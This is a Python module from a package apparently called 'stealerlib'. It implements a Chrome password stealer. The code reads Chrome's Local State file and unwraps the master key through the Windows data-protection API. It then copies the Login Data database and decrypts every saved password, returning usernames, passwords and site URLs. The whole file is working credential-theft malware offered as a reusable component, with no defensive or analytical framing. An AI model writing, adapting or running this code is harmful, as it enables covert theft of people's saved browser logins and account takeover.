#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/passwords.py
"""

from stealerlib.browser import *
from stealerlib.exceptions import *


class Chrome:
    """This class provides methods for extracting and decrypting passwords from Browser databases.

    Attributes:
        cookies         Saved Chrome Cookies
        usernames       Saved Chrome Usernames
        passwords       Saved Chrome Passwords
        credentials     A list of tuples containing the username, password and URL -
                        for each site a password was saved on

        path            Path to Chrome's base directory
        chrome_db_path  Path to the browsers local database
        key             Encryption key to be used when accessing encrypted values in the database
    """

    def __init__(self):
        self.cookies = []
        self.usernames = []
        self.passwords = []
        self.credentials = []

        self.chrome_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        self.chrome_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        self.chrome_key = self.get_encryption_key()

    @catch
    def get_encryption_key(self) -> str:
        """Retrieves the master encryption key used to encrypt the user's Chrome data

        Parameters:
            self (object): The object passed to the method

        Returns:
            str: The encryption key we'll use to decrypt the user's passwords
        """

        with open(self.chrome_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        mkey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        mkey = mkey[5:]
        mkey = win32crypt.CryptUnprotectData(mkey, None, None, None, 0)[1]

        return mkey

    @catch
    def decrypt_password(self, password: str, key: str) -> str:
        """Decrypts an encrypted password using the given encryption key

        Parameters:
            self (object): The object passed to the method
            password (str): The encrypted password to decrypt
            key (str): The master key to use for the decryption

        Returns:
            str: The decrypted password
        """

        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

    @catch
    def get_passwords_chromium(self) -> list[tuple[str, ...]]:
        """Retrieves the username and password from Chrome browser by connecting to the Chrome database file and decrypting the password using the encryption key.

        Parameters:
            self (object): The object passed to the method

        Returns:
            list[tuple[str, ...]]: list of (username, password) tuples 

        Example:
            browser = Browser()
            browser.get_passwords_chromium()
        """

        with tempfile.TemporaryDirectory() as tmpdir:
            select_query = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"

            db_file = "{}\ChromeData.db".format(tmpdir)
            shutil.copyfile(self.chrome_db_path, db_file)
            db = sqlite3.connect(db_file)
            cursor = db.cursor()
            cursor.execute(select_query)

            for row in cursor.fetchall():
                origin_url = row[0] 
                username = row[2]
                password = self.decrypt_password(row[3], self.chrome_key)   

                if username or password:
                    self.passwords.append(password)
                    self.usernames.append(username)
                    self.credentials.append((username, password, origin_url))
                else:
                    continue

        return self.credentials